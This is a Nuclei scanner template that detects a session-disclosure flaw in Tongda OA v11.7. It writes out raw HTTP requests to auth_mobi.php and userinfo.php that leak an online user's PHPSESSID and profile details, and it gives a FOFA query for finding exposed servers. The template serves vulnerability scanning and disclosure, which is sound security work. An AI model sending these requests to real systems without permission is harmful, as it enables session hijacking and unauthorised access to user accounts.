http:
    - matchers:
        - part: all
          status:
            - 200
          type: status
        - condition: and
          part: body
          type: word
          words:
            - '"dept_name":"'
            - '"online_flag":'
        - part: header
          type: word
          words:
            - application/json
      matchers-condition: and
      raw:
        - |
          GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36
          Connection: close
        - |
          POST /general/userinfo.php?UID=1 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Safari/537.36
          Connection: close
      stop-at-first-match: true
id: tongda-user-session-disclosure
info:
    author:
        - kzaopa
    description: |
        通达OA v11.7 存在在线用户会话信息泄露漏洞。
        攻击者可通过 auth_mobi.php 获取在线用户的 PHPSESSID，结合 userinfo.php 接口获取用户详细信息（部门、在线状态等）。
    metadata:
        fofa-query: app="TDXK-通达OA"
        verified: true
    name: Tongda OA User Session Disclosure
    reference:
        - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
    severity: high
    tags:
        - tongda
        - oa
        - session-disclosure
        - user-disclosure
        - intrusive
